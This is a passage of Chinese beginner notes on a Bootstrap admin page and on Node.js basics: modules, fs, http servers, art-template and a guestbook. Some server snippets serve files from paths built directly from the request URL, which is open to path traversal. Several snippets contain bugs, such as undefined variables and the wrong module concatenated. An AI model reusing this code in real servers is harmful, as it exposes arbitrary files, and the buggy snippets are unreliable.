                                <ul class="dropdown-menu">
                                    <!--TODO-->
                                </ul>
                            </div>
                        </div>
                        <!--序列化表单 获取表单元素的值-->
                        <input type="hidden" name="categoryId">
                    </div>
                    <div class="form-group">
                        <input name="brandName" type="text" class="form-control" placeholder="请输入二级分类名称">
                    </div>
                    <div class="form-group"  style="position: relative">
                        <button class="btn btn-default">上传图片</button>
                        <input type="file" name="pic1">
                        <input type="hidden" name="brandLogo">
                    </div>
                    <img id="uploadImage" src="images/none.png"  width="100" height="100" alt="">
                    <!--校验插件 必须有submit  用form外的submit关联-->
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>
                <button type="submit" form="form" class="btn btn-primary">确认</button>
            </div>
        </div>
    </div>
</div>

```
* 整体 代码
```
<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>后台管理系统-二级分类</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css"/>
    <link rel="stylesheet" href="assets/nprogress/nprogress.css"/>
    <link rel="stylesheet" href="css/admin.css"/>
    <style>
        [name="pic1"]{
            width: 82px;
            height: 34px;
            overflow: hidden;
            display: block;
            opacity:0;
            position: absolute;
            left: 0;
            top:0
        }
    </style>
</head>
<body>
<!--侧边栏-->
<aside class="ad_aside">
    <!--商标-->
    <div class="brand"><a href="index.html">ITCAST</a></div>
    <!--用户-->
    <div class="user">
        <img src="images/default.png" alt=""/>
        <span>超级管理员</span>
    </div>
    <!--菜单-->
    <div class="menu">
        <ul>
            <li><a href="userManage.html"><span class="glyphicon glyphicon-user"></span> 用户管理</a></li>
            <li class="now">
                <a href="javascript:;"><span class="glyphicon glyphicon-list"></span> 分类管理</a>
                <div class="child">
                    <a href="categoryFirst.html">一级分类</a>
                    <a class="now" href="categorySecond.html">二级分类</a>
                </div>
            </li>
            <li><a href="productManage.html"><span class="glyphicon glyphicon-tags"></span> 商品管理</a></li>
        </ul>
    </div>
</aside>
<!--内容-->
<section class="ad_section">
    <!--顶部导航-->
    <nav class="ad_nav">
        <a data-menu href="javascript:;"><span class="glyphicon glyphicon-align-justify"></span></a>
        <a data-logout href="javascript:;"><span class="glyphicon glyphicon-log-out"></span></a>
    </nav>
    <div class="container-fluid">
        <!--路径导航-->
        <ol class="breadcrumb">
            <li><a href="#">管理系统</a></li>
            <li class="active">分类管理</li>
            <li class="active">二级分类</li>
        </ol>
        <div class="ad_content">
            <button data-toggle="modal" data-target="#save" class="btn btn-default mb_15">添加分类</button>
            <table class="table table-bordered">
                <thead>
                    <tr>
                        <th>序号</th>
                        <th>一级分类名称</th>
                        <th>二级分类名称（品牌）</th>
                        <th>品牌logo</th>
                    </tr>
                </thead>
                <tbody>

                </tbody>
            </table>
            <nav class="text-right">
                <ul class="pagination">
                   <!--TODO-->
                </ul>
            </nav>
        </div>
    </div>
</section>
<script type="text/template" id="list">
    <% var $ = getJquery(); %>
    <% $.each(rows,function(i,item){ %>
        <tr>
            <!--序号+（页码-1）*每页展示数量-->
            <th scope="row"><%=i+1+(page-1)*size%></th>
            <td><%=item.categoryName%></td>
            <td><%=item.brandName%></td>
            <td><img width="40" height="40" src="<%=item.brandLogo%>" alt=""></td>
        </tr>
    <% }); %>
</script>
<div class="modal fade" id="save">
    <div class="modal-dialog modal-sm" >
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
                <h4 class="modal-title">添加分类</h4>
            </div>
            <div class="modal-body">
                <form id="form">
                    <div class="form-group">
                        <div>
                            <label>一级分类:</label>
                            <!--下拉菜单-->
                            <div class="dropdown btn-group">
                                <button class="btn btn-default dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown">
                                    <span class="categoryName">请选择</span>
                                    <span class="caret"></span>
                                </button>
                                <ul class="dropdown-menu">
                                    <!--TODO-->
                                </ul>
                            </div>
                        </div>
                        <!--序列化表单 获取表单元素的值-->
                        <input type="hidden" name="categoryId">
                    </div>
                    <div class="form-group">
                        <input name="brandName" type="text" class="form-control" placeholder="请输入二级分类名称">
                    </div>
                    <div class="form-group"  style="position: relative">
                        <button class="btn btn-default">上传图片</button>
                        <input type="file" name="pic1">
                        <input type="hidden" name="brandLogo">
                    </div>
                    <img id="uploadImage" src="images/none.png"  width="100" height="100" alt="">
                    <!--校验插件 必须有submit  用form外的submit关联-->
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">取消</button>
                <button type="submit" form="form" class="btn btn-primary">确认</button>
            </div>
        </div>
    </div>
</div>
<script type="text/template" id="dropDown">
    <% var $ = getJquery(); %>
    <% $.each(rows,function(i,item){%>
        <li><a data-id="<%=item.id%>" href="javascript:;"><%=item.categoryName%></a></li>
    <% }); %>
</script>
<script src="assets/jquery/jquery.min.js"></script>
<script src="assets/bootstrap/js/bootstrap.min.js"></script>
<script src="assets/nprogress/nprogress.js"></script>
<script src="assets/artTemplate/template-native.js"></script>
<script src="assets/bootstrap-paginator/bootstrap-paginator.min.js"></script>
<!--上传插件-->
<script src="assets/jquery-fileupload/jquery.ui.widget.js"></script>
<script src="assets/jquery-fileupload/jquery.fileupload.js"></script>
<!--检验插件-->
<script src="assets/bootstrap-validator/js/bootstrapValidator.min.js"></script>
<script src="js/admin.js"></script>
<script src="js/categorySecond.js"></script>
</body>
</html>
```
>[danger] ##### 整体的js分析
```
1.fileupload 插件处理文件上传
2.bootstrapValidator 配置上属性：excluded:[],就可以去校验隐藏的input框
3.当使用  bootstrapValidator  注意在每个判断下更改判断状态列如：          $('#form').data('bootstrapValidator').updateStatus('brandLogo','VALID');

```
```
$(function () {
    window.page = 1;

    /*模板无法访问外部变量的解决方案*/
    /*var getJquery = function () {
        return jQuery;
    }*/
    /*辅助方法：在模板内部可以使用的函数*/
    template.helper('getJquery',function () {
        return jQuery;
    });

    /*1.默认第一页展示*/
    var render = function () {
        getCateSecondData(function (data) {
            /*模板渲染*/
            $('tbody').html(template('list',data));
            /*初始化分页组件  根据数据*/
            /*2.分页展示*/
            $('.pagination').bootstrapPaginator({
                /*对应的bootstrap版本*/
                bootstrapMajorVersion:3,
                /*分页按钮的大小*/
                size:'small',
                /*当前页码*/
                currentPage:data.page,
                /*一共多少页*/
                totalPages:Math.ceil(data.total/data.size),
                /*页码按钮的数量 默认是5*/
                numberOfPages:3,
                /*点击页码渲染*/
                /*监听按钮的点击事件 获取点击的时候的页码*/
                onPageClicked:function (event, originalEvent, type,page) {
                    /*1. event jquery的事件對象*/
                    /*2. originalEvent 原生dom的事件對象*/
                    /*3. type 按鈕的類型 */
                    /*4. 按鈕對應的頁碼*/
                    //console.log(page);
                    window.page = page;
                    render();
                }
            });
        });
    }
    render();
    /*3.点击添加分类弹窗*/
    getCateFirstData(function (data) {
        $('.dropdown-menu').html(template('dropDown',data)).find('li').on('click',function () {
            /*显示选中的分类名称*/
            var $currA = $(this).find('a');
            $('.categoryName').html($currA.html());
            /*给隐藏的ID表单赋值*/
            $('[name=categoryId]').val($currA.attr('data-id'));
            /*改校验状态*/
            $('#form').data('bootstrapValidator').updateStatus('categoryId','VALID');
        })
    });
    /*http://www.jq22.com/jquery-info230 fileupload*/
    initFileUpload();

    /*4.点击确认按钮  提交 （一级分类id，二级分类名称，二级分类的logo） */
    /*$('#save').on('click','.btn-primary',function (e) {
        e.preventDefault();
        /!**!/

        $('#save').modal('hide');
    });*/
    $('#form').bootstrapValidator({
        /*默认不去校验的表单元素（包含隐藏）*/
        excluded:[],
        /*配置校验的不同状态下显示的图标*/
        feedbackIcons: {
            valid: 'glyphicon glyphicon-ok',
            invalid: 'glyphicon glyphicon-remove',
            validating: 'glyphicon glyphicon-refresh'
        },
        /*需要校验的表单元素 通过名称 name*/
        fields: {
            brandName: {
                validators: {
                    notEmpty: {
                        message: '请输入二级分类名称'
                    }
                }
            },
            categoryId: {
                validators: {
                    notEmpty: {
                        message: '请选择一级分类'
                    }
                }
            },
            brandLogo:{
                validators: {
                    notEmpty: {
                        message: '请输入二级分类名称'
                    }
                }
            }
        }
    }).on('success.form.bv', function (e) {
        e.preventDefault();

        var $form = $(e.target);

        $.ajax({
            type:'post',
            url:' /category/addSecondCategory',
            data:$form.serialize(),
            dataType:'json',
            success:function (data) {
                if(data.success == true){
                    window.page = 1;
                    render();
                    $('#save').modal('hide');
                }
            }
        });
    });
});
var getCateSecondData = function (callback) {
    $.ajax({
        type:'get',
        url:'/category/querySecondCategoryPaging',
        data:{
            page: window.page || 1,
            pageSize:2
        },
        dataType:'json',
        success:function (data) {
            callback && callback(data);
        }
    });
};
var getCateFirstData = function (callback) {
    $.ajax({
        type:'get',
        url:'/category/queryTopCategoryPaging',
        data:{
            page: 1,
            pageSize:1000
        },
        dataType:'json',
        success:function (data) {
            callback && callback(data);
        }
    });
};
var initFileUpload = function () {
    /*初始化上次插件*/
    $('[name="pic1"]').fileupload({
        /*上传地址*/
        url:'/category/addSecondCategoryPic',
        /*返回格式*/
        dataType: 'json',
        /*上传成功*/
        done: function (e, data) {
            $('#uploadImage').attr('src',data.result.picAddr);
            $('[name="brandLogo"]').val(data.result.picAddr);
            $('#form').data('bootstrapValidator').updateStatus('brandLogo','VALID');
        }
    });
}
```
[TOC]
>[success] # 什么是NODE.JS
```
1.只是一个可以让js在脱离浏览器环境跑起来的环境
2.既不是语言，也不是框架，它是一个平台
3.Node.js是一个让JavaScript运行在服务器端的开发平台，它让JavaScript的触角
伸到了服务器端
4.Node.js跳过了Apache、Naginx、IIS等HTTP服务器，它自己不用建设在任何服务器软件之上
```
>[danger] ##### 特点
```
1.单线程，单线程的好处，减少了内存开销，操作系统的内存换页。
如果某一个事情，进入了，但是被I/O阻塞了，所以这个线程就阻塞了。
2.非阻塞I/O， 不会傻等I/O语句结束，而会执行后面的语句。
非阻塞就能解决问题了么？比如执行着小红的业务，执行过程中，小刚的I/O回调、完成了，此时怎么办？？
3.事件机制，事件环，不管是新用户的请求，还是老用户的I/O完成，都将以事件方式加入事件环，等待调度。
```
>[danger] ##### 适合做什么
```
Node.js适合用来开发什么样的应用程序呢？
善于I/O，不善于计算。因为Node.js最擅长的就是任务调度，如果你的业务有很多
的CPU计算，实际上也相当于这个计算阻塞了这个单线程，就不适合Node开发。
当应用程序需要处理大量并发的I/O，而在向客户端发出响应之前，应用程序内部
并不需要进行非常复杂的处理的时候，Node.js非常适合。Node.js也非常适合与
web socket配合，开发长连接的实时交互应用程序。
● 用户表单收集
● 考试系统
● 聊天室
● 图文直播
● 提供JSON的API（为前台Angular使用）

```
>[danger] ##### Node.js 中的 JavaScript
```
1.没有 BOM、DOM的操作方法
2.EcmaScript 基本的 JavaScript 语言部分
3.在 Node 中为 JavaScript 提供了一些服务器级别的 API例如：文件操作的能力、http 服务的能力
4.使用node 为js 提供的核心模块，调用require方法例如文件读写require('fs')
```
* 常见的EcmaScript
```
变量
方法
数据类型
内置对象
Array
Object
Date
Math
```
>[success] # node.js 基本使用
```
1.下载node，node  + 文件名 运行例如：F:\testNodes>node helloword.js
2.在win系统下利用shift 加右键 可以快速弹窗在该文件下的cmd
```
>[danger] ##### 关于js 是否用; 结尾
```
1.当一行代码是以： (    [   ` ,开头的时候，则在前面补上一个分号用以避免
一些语法解析错误, 所以在一些第三方的代码中能看到一上来就以一个 ; 开
头。
2.结论：无论你的代码是否有分号，都建议如果一行代码是以 (、[、` 开头
的，则最好都在其前面补上一个分号,有些人也喜欢玩儿一些花哨的东西，例
如可以使用 ! ~ 等。
```
```
function say() {
    console.log('hello world')
}

say()

;(function () {
    console.log('hello')
})()

;['1','2']

;`你好
我是谁`
```
>[danger] ##### 编写helloword
```
var a = "helloword";
console.log(a);
```
* 在node 环境下运行 打印结果
```
helloword
```
>[danger] ##### 部分核心模块内容
```
// 用来操作路径的
var path = require('path')

// 获取当前机器的 CPU 信息
console.log(os.cpus())

// memory 内存
console.log(os.totalmem())

// 获取一个路径中的扩展名部分
// extname extension name
console.log(path.extname('c:/a/b/c/d/hello.txt'))
```
>[danger] ##### 获取文件路径
```
var fs = require('fs')
var path = __dirname
fs.readdir(path, function (err, files) {
    if (err) {
        return console.log('目录不存在')
    }
    console.log(files)
})
```
* 打印结果
```
[ '.idea', 'data', 'helloword.js', 'import', 'views' ]
```
>[success] # node.js 引入模块概念
* 创建目录
![](https://box.kancloud.cn/0ac99438126e1fc5b66d9764f71ca993_161x70.png)
```
1.在 Node 中，没有全局作用域，只有模块作用域，外部访
问不到内部，内部也访问不到外部，默认都是封闭的，下面
的案例当使用require 在a模块去访问b模块打印是空对象，
只能将b模块的内容输出
2.让模块与模块之间进行通信，使用对象exports，exports 
默认是一个空对象要做的就是把所有需要被外部访问的成员
挂载到这个 exports 对象中
```
>[danger] ##### 案例讲解
* a.js
```
// 引用的时候可以省略后缀 例如require('./b')
var objB = require('./b.js')
console.log(objB)
```
* b.js
```
var name = "b"
console.log(name)
```
* 在a中调用b运行a的结果
```
b
{}
```
>[danger] ##### exports  桥梁
* a.js
```
var objB = require('./b')
console.log(objB)
```
* b.js
```
var name = "b"
console.log(name)

exports.name = name
```
* 打印结果
```
b
{ name: 'b' }
```
>[danger] ##### 是为什可以利用exports 进行导入
* 首先其实使用node时候，默认已经写好的内容如下
```
1.也就默认有一个module 对象，对象中有一个exports的键值对
2.最后返回的是module.exports 这个内容
3.所以其实当使用 exports名称 = 变量 ，就是往module中的exports传值
4.在使用的时候 var objb = require('./b')  接受的返回值实际是exports 对象，
所以调用的时候 objb指向的是exports对象，所以objb 能够点出对应属性
```
```
var module = {
  exports: {
    
  }
}

return module.exports

```
* 如果之引入单个模块如何直接使用
```
1.直接这么使用 module.exports = num
2.这样使用后 就直接吧module 的value 从对象，变成了指定的类型
```
* a.js
```
var objb = require('./b')

console.log(objb)
```
* b.js
```
var num = 1
module.exports = num
```
* 打印结果
```
1
```
>[danger] ##### 使用require 导入的三种情况
```
1.导入核心模块例如fs/http 等模块
2.下载的模块例如art-template之类的模块
3.自己编写的模块路径导入
```
* 为什么只用自己编写的路径需要地址导入
```
1.核心模块的本质也是文件，核心模块文件已经被编译到了二进制文件中
了，我们只需要按照名字来加载就可以了

2.第三方模块，凡是第三方模块都必须通过 npm 来下载，使用的时候就可以
通过 require('包名') 的方式来进行加载才可以使用，不可能有任何一个第三
方包和核心模块的名字是一样的

3.第三方模块的加载方式，先找到当前文件所处目录中的 node_modules 目
录例如：
    node_modules/art-template
    node_modules/art-template/package.json 文件
    node_modules/art-template/package.json 文件中的 main 属性 main 属性中就记录了 art-template 的入口模块

4.如果 package.json 文件不存在或者 main 指定的入口模块是也没有，则 
node 会自动找该目录下的 index.js，也就是说 index.js 会作为一个默认备选
项， 如果以上所有任何一个条件都不成立，则会进入上一级目录中的
node_modules 目录查找，如果上一级还没有，则继续往上上一级查找
，如果直到当前磁盘根目录还找不到，最后报错：
```
>[danger] ##### node_module注意点
```
1.我们一个项目有且只有一个 node_modules，放在项目根目录中，这样的
话项目中所有的子目录中的代码都可以加载到第三方包 ，不会出现有多个 
node_modules模块查找机   优先从缓存加 核心模块 路径形式的文件模块  
第三方模块
2.一个项目有且仅有一个 node_modules 而且是存放到项目的根目录
```
>[success] # 简单使用文件读写
```
1. fs 是 file-system 的简写，就是文件系统的意思
2. 在 Node 中如果想要进行文件操作，就必须引入 fs 这个核心模块
3. 在 fs 这个核心模块中，就提供了所有的文件操作相关的 API
4. 引入核心模块使用require
```
>[danger] ##### readFile 读取文件信息
```
1.读取文件信，第一个参数读取文件路径
2.第二个参数中的回调函数中，第一个参数是操作错误后的错误信息，第二个参
数是讲文件读取把二进制转换成十六进制的格式简单的说：文件读取成功 data 有
数据/error 是null ， 文件读取失败 data 是undefined未定义，error是错误对象信息
3.利用toString()方法将十六进制转换成文本信息
```
```
// 调用操作文件的方法
var fs = require('fs')

fs.readFile('./data/test',function (error,data) {
    if(error){
        console.log("读取失败")
    }else{
        console.log('读取的是二进制转换成十六进制的编码格式', data)
        console.log(data.toString())
    }
});
```
* 打印结果
```
读取的是二进制转换成十六进制的编码格式 <Buffer e6 88 91 e6 98 af e6 96 87 e4 bb b6 e8 af bb e5 8f 96 e5 86 85 e5 ae b9 2a>
我是文件读取内容*
```
>[danger] ##### writeFile 写文件
```
1.第一个参数：文件路径
2.第二个参数：文件内容
3.第三个参数：回调函数 其中回调函数中的error  当文件写入成功：error 是 
null，当文件写入失败，error 就是错误对象信息
```
```
// 调用操作文件的方法
var fs = require('fs')

fs.writeFile('./data/node.txt','我是写入文件中的内容',function (error) {
    if(error){
        console.log("写入失败")
    }else{
        console.log('写入成功的error', error)
        console.log('写入成功')
    }
});
```
* 打印结果
```
写入成功的error null
写入成功
```

[TOC]
>[success] # 搭建Node 服务器
```
1.使用Node 中专门提供了一个核心模块：http个模块的职责就是帮你创建编写服务器的
```
>[danger] ##### 使用http 核心模块搭建
```
1.第一步创建核心模块var http = require('http')
2.使用 http.createServer() 方法创建一个 Web 服务器
3.利用创建服务器的返回实例进行数据请求响应处理
4.绑定服启动的端口
5.请求时时候参数，回调函数中有两个参数，第一个是接受请求的参数请求对象
可以用来获取客户端的一些请求信息，例如请求路径，第二个是接受响应的参数
响应对象可以用来给客户端发送响应消息    
6.在每次响应结束后用end方法，才能保证结束响应
7.获取请求路径request.url
8.获取请求客户地址：req.socket.remoteAddress
```
```
// 调用http 核心模块
var http = require('http')

// 创建web 服务器
var server = http.createServer();

// 创建服务器接受请求
server.on('request', function (request, response) {
    console.log('收到客户端的请求了')
    console.log('收到客户端的请求了，请求路径是：' + request.url)
    // response 对象有一个方法：write 可以用来给客户端发送响应数据
    // write 可以使用多次，但是最后一定要使用 end 来结束响应，否则客户端会一直等待
    response.write('hello')
    response.write(' nodejs')

    // 告诉客户端，我的话说完了，你可以呈递给用户了
    response.end()
});

// 创建 端口号
server.listen(3000, function () {
    console.log('服务器启动成功了，可以通过 http://127.0.0.1:3000/ 来进行访问')
})
```
>[danger]  ##### 根据url访问模拟网站请求
```
1.可以直接使用res.end('hello nodejs') 一步到位响应数据
2.连接默认/开头
3.只能响应二进制数据或者字符串，所以要把对象进行装换成字符串stringify()方法
```
```
var http = require('http')

// 1. 创建 Server
var server = http.createServer()

// 2. 监听 request 请求事件，设置请求处理函数
server.on('request', function (req, res) {
    console.log('收到请求了，请求路径是：' + req.url)
    console.log('请求我的客户端的地址是：', req.socket.remoteAddress, req.socket.remotePort)
    
    // res.end('hello nodejs')

    // 根据不同的请求路径发送不同的响应结果
    // 1. 获取请求路径
    //    req.url 获取到的是端口号之后的那一部分路径
    //    也就是说所有的 url 都是以 / 开头的
    // 2. 判断路径处理响应

    var url = req.url

    if (url === '/') {
        res.end('index page')
    } else if (url === '/login') {
        res.end('login page')
    } else if (url === '/products') {
        var products = [{
            name: '苹果 X',
            price: 8888
        },
            {
                name: '菠萝 X',
                price: 5000
            },
            {
                name: '小辣椒 X',
                price: 1999
            }
        ]

        // 响应内容只能是二进制数据或者字符串
        res.end(JSON.stringify(products))
    } else {
        res.end('404 Not Found.')
    }
})

// 3. 绑定端口号，启动服务
server.listen(3000, function () {
    console.log('服务器启动成功，可以访问了。。。')
})

```
>[success] # 构造响应头
```
1.使用res.setHeader构造请求头
2.如果不规定响应头浏览器默认按照当前操作系统的默认编码去解析，win是gbk所以会出现请求后出现乱码的情况，text/plain 是普通文本，text/html是将html解析后展示
3.res.setHeader('Content-Type', 'text/plain; charset=utf-8') 告诉浏览器用utf-8解析
```
>[danger] ##### 纯百分百靠字符串返回响应
```
// require
// 端口号

var http = require('http')

var server = http.createServer()

server.on('request', function (req, res) {

    // 获取请求的url
    var url = req.url

    if (url === '/plain') {
        // text/plain 就是普通文本
        // res.setHeader('Content-Type', 'text/plain; charset=utf-8')
        res.end('hello 世界')
    } else if (url === '/html') {
        // 如果你发送的是 html 格式的字符串，则也要告诉浏览器我给你发送是 text/html 格式的内容
        res.setHeader('Content-Type', 'text/html; charset=utf-8')
        res.end('<p>hello html <a href="">点我</a></p>')
    }
})

server.listen(3000, function () {
    console.log('Server is running...')
})

```
>[danger] ##### 利用文件的读取
```
1.利用读取文件响应，其中响应到浏览器的内容，算然读取出来的的是16进制，但是res.end，既可以toString()一下，也可以省略
```
```
var http = require('http')
var fs = require('fs')

var server = http.createServer()

server.on('request', function (req, res) {
    // / index.html
    var url = req.url

    if (url === '/') {

        // 我们要发送的还是在文件中的内容
        fs.readFile('../views/index.html', function (err, data) {
            if (err) {
                res.setHeader('Content-Type', 'text/plain; charset=utf-8')
                res.end('文件读取失败，请稍后重试！')
            } else {
                // data 默认是二进制数据，可以通过 .toString 转为咱们能识别的字符串
                // res.end() 支持两种数据类型，一种是二进制，一种是字符串
                res.setHeader('Content-Type', 'text/html; charset=utf-8')
                res.end(data)
            }
        })
    } else if (url === '/xiaoming') {
        fs.readFile('../resource/ab2.jpg', function (err, data) {
            if (err) {
                res.setHeader('Content-Type', 'text/plain; charset=utf-8')
                res.end('文件读取失败，请稍后重试！')
            } else {
                // data 默认是二进制数据，可以通过 .toString 转为咱们能识别的字符串
                // res.end() 支持两种数据类型，一种是二进制，一种是字符串
                // 图片就不需要指定编码了，因为我们常说的编码一般指的是：字符编码
                res.setHeader('Content-Type', 'image/jpeg')
                res.end(data)
            }
        })
    }
})

server.listen(3000, function () {
    console.log('Server is running...')
})

```
[TOC]
>[success] # 结合后台框架创建简单的web框架
```
1.思路获取当前文件目录，指定存储的网页文件夹路径进行html拼接
```
>[danger] ##### 思路代码
```
1.__dirname 获取当前文件路径
2.path.join(__dirname, '/views'); 将保存html文件的views 路径拼接上去
```
```
var http = require('http')
var fs = require('fs')
var path = require('path');

var server = http.createServer()

// 指定储存的文件路径，在获取url后进行拼接找到指定文件目录
// var wwwDir = 'F:/testNodes/views'
// 后台思想获取当前文件的运行目录  F:\testNodes
var wwwDir = __dirname

// 规定views层 路径
var viewsPath = path.join(__dirname, '/views');


server.on('request', function (req, res) {
    // 获取请求的url
    var url = req.url
    if (url === '/') {
        fs.readFile(viewsPath + '/index.html', function (erro, data) {
            if (erro) {
                // 文件不存在 返回 404 这里return 方法返回值、阻止代码继续往后执行
                return res.end('404')
            }
            res.end(data)
        })
    } else if (url === '/login.html') {
        fs.readFile(viewsPath + '/index.html', function (erro, data) {
            if (erro) {
                // 文件不存在 返回 404 这里return 方法返回值、阻止代码继续往后执行
                return res.end('404')
            }
            res.end(data)
        })
    }else{
        res.end('404')
    }

})// end server

server.listen(3000, function () {
    console.log('running...')
});
```
>[danger] ##### 上面思路升级版本
```
1.判断用户输入的路径是不是/，如果是就访问定义好的首页路径，如果不是就更改这个路径
2.将更改的路径直接用文件读取如果用户存在的
```
```
var http = require('http')
var fs = require('fs')

var server = http.createServer()

var wwwDir = 'D:/Movie/www'

server.on('request', function (req, res) {
  var url = req.url
  // / index.html
  // /a.txt wwwDir + /a.txt
  // /apple/login.html wwwDir + /apple/login.html
  // /img/ab1.jpg wwwDir + /img/ab1.jpg
  

  var filePath = '/index.html'
  if (url !== '/') {
    filePath = url
  }

  fs.readFile(wwwDir + filePath, function (err, data) {
    if (err) {
      return res.end('404 Not Found.')
    }
    res.end(data)
  })
})

// 3. 绑定端口号，启动服务
server.listen(3000, function () {
  console.log('running...')
})
```
>[success]  # 模板语言
```
1.模板语言文件读取的字符串，用replace进行替换标记内容
```  
>[danger] ##### 代码
```
var http = require('http')
var fs = require('fs')
var path = require('path');

var server = http.createServer()

var wwwDir = __dirname

// 规定views层 路径
var viewsPath = path.join(__dirname, '/views');

var filePath = '/index.html'
server.on('request', function (req, res) {
    var url = req.url


    if(url !=='/'){
        filePath = url
    }
    console.log(viewsPath + filePath)
    fs.readFile(viewsPath + filePath, function (err, data) {
        if (err) {
            return res.end('404 Not Found.')
        }
        // 生成需要替换的内容
        var content = ''
        files.forEach(function (item) {
            // 在 EcmaScript 6 的 ` 字符串中，可以使用 ${} 来引用变量
            content += `
          <tr>
            <td data-value="apple/"><a class="icon dir" href="/D:/Movie/www/apple/">${item}/</a></td>
            <td class="detailsColumn" data-value="0"></td>
            <td class="detailsColumn" data-value="1509589967">2017/11/2 上午10:32:47</td>
          </tr>
        `
        })

        // 2.3 替换
        data = data.toString()
        data = data.replace('^_^', content)

        // 3. 发送解析替换过后的响应数据
        res.end(data)  
    })
})

// 3. 绑定端口号，启动服务
server.listen(3000, function () {
    console.log('running...')
})
```
>[success] # 正确使用模板
```
1.使用的是art-template 模板
2.安装方法：npm install art-template， 该命令在哪执行就会把包下载到
哪里。默认会下载到 node_modules 目录中，node_modules 不要改，也
不支持改。
3.使用：只需要使用 require 方法加载就可以了：require('art-template')
```
>[danger] ##### 使用
* node.js
```
var template = require('art-template')
var fs = require('fs')

fs.readFile('./views/index.html',function (err,data) {
    if(err){
        return console.log('读取文件失败')
    }

    var ret = template.render(data.toString(), {
        name: 'Jack',
        age: 18,
        province: '北京市',
        hobbies: [
            '写代码',
            '唱歌',
            '打游戏'
        ],
        title: '个人信息'
    })

    console.log(ret)
})
```
* html 端
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{{ title }}</title>
</head>
<body>
  <p>大家好，我叫：{{ name }}</p>
  <p>我今年 {{ age }} 岁了</p>
  <h1>我来自 {{ province }}</h1>
  <p>我喜欢：{{each hobbies}} {{ $value }} {{/each}}</p>
  <script>
    var foo = '{{ title }}'
  </script>
</body>
</html>
```
[TOC]
>[success] # 处理静态文件
* 项目结构
![](https://box.kancloud.cn/ca0aa5ff16f011d9def32b8bfc29a5dc_196x235.png)
>[danger] ##### 处理静态文件
* 另一种启动 写法
```
var http =require('http')
var fs = require('fs')
var template = require('art-template')

// 直接用http 创建web服务器
http.createServer(function (req, res) {
    // 业务逻辑处理
    
    
}).listen(3000,function () {
    
    console.log('runing...')
})
```
* 处理静态文件
```
1.把静态资源统一放到了public 中这样只要用indexOf()判断请求路径开头是不是/public/，如果是读取public文件夹下的所有内容
```
```
var http = require('http')
var fs = require('fs')
var template = require('art-template')

// 直接用http 创建web服务器
http.createServer(function (req, res) {
    var url = req.url
    if(url === '/'){
        fs.readFile('./views/index.html',function (err,data) {
            if(err){
                return res.end('404found')
            }
            
            var htmlStr = template.render(data.toString(), {
                comments: '1'
            })
            
            res.end(htmlStr)
        })
        
    }else if(url.indexOf('/public/') === 0){
        fs.readFile('.' + url, function (err, data) {
            if (err) {
                return res.end('404 Not Found.')
            }
            res.end(data)
        })
    }

}).listen(3000, function () {

    console.log('runing...')
})
```
>[success] #  留言板功能
![](https://box.kancloud.cn/a1c42ecbe3c4e16344f0e675fa8c93d0_218x189.png)
```
1.var url = require('url') 将get模式的url 进行拆分
2.var parseObj = url.parse(req.url, true) 把url和?后面的参数拆分成对象的方
法 例如：
                    Url {
                      protocol: null,
                      slashes: null,
                      auth: null,
                      host: null,
                      port: null,
                      hostname: null,
                      hash: null,
                      search: '',
                      query: {},
                      pathname: '/favicon.ico',
                      path: '/favicon.ico',
                      href: '/favicon.ico' }

3.parseObj.pathname 获取url
4. parseObj.query 获取?后面的参数对象
5. 重定向利用响应，重新定义响应头 res.statusCode = 302 res.setHeader('Location', '/')
```
>[danger] app.js
```
var http = require('http')
var fs = require('fs')
var url = require('url')

var template = require('art-template')


var comments = [
    {
        name: '张三',
        message: '今天天气不错！',
        dateTime: '2015-10-16'
    },
    {
        name: '张三2',
        message: '今天天气不错！',
        dateTime: '2015-10-16'
    },
    {
        name: '张三3',
        message: '今天天气不错！',
        dateTime: '2015-10-16'
    },
    {
        name: '张三4',
        message: '今天天气不错！',
        dateTime: '2015-10-16'
    },
    {
        name: '张三5',
        message: '今天天气不错！',
        dateTime: '2015-10-16'
    }
]

// 直接用http 创建web服务器
http.createServer(function (req, res) {
    var parseObj = url.parse(req.url, true)
    console.log(parseObj)
    var pathname = parseObj.pathname
    console.log(pathname)

    if(pathname === '/'){
        fs.readFile('./views/index.html',function (err,data) {
            if(err){
                return res.end('404found')
            }

            var htmlStr = template.render(data.toString(), {
                comments: comments
            })

            res.end(htmlStr)
        })

    }else if(pathname === '/post'){
        fs.readFile('./views/post.html',function (err,data) {
            if(err){
                return res.end('404found')
            }
            res.end(data)
        })

    }else if(pathname === '/pinglun'){


        var comment = parseObj.query
        comment.dateTime = '2018-11-2 17:11:22'
        comments.unshift(comment)
        res.statusCode = 302
        res.setHeader('Location', '/')
        res.end()


    }else if(pathname.indexOf('/public/') === 0){
        fs.readFile('.' + url, function (err, data) {
            if (err) {
                return res.end('404 Not Found.')
            }
            res.end(data)
        })
    }

}).listen(3000, function () {
    console.log('runing...')
})
```
>[danger] ##### views/index.html
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>留言本</title>

    <link rel="stylesheet" href="/public/lib/bootstrap/dist/css/bootstrap.css">
</head>

<body>
<div class="header container">
    <div class="page-header">
        <h1>Example page header <small>Subtext for header</small></h1>
        <a class="btn btn-success" href="/post">发表留言</a>
    </div>
</div>
<div class="comments container">
    <ul class="list-group">
        {{each comments}}
        <li class="list-group-item">{{ $value.name }}说：{{ $value.message }} <span class="pull-right">{{ $value.dateTime }}</span></li>
        {{/each}}
    </ul>
</div>
</body>

</html>

```
>[danger] ##### viewsd/post.html
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Document</title>
  <link rel="stylesheet" href="/public/lib/bootstrap/dist/css/bootstrap.css">
</head>

<body>
  <div class="header container">
    <div class="page-header">
      <h1><a href="/">首页</a> <small>发表评论</small></h1>
    </div>
  </div>
  <div class="comments container">

    <form action="/pinglun" method="get">
      <div class="form-group">
        <label for="input_name">你的大名</label>
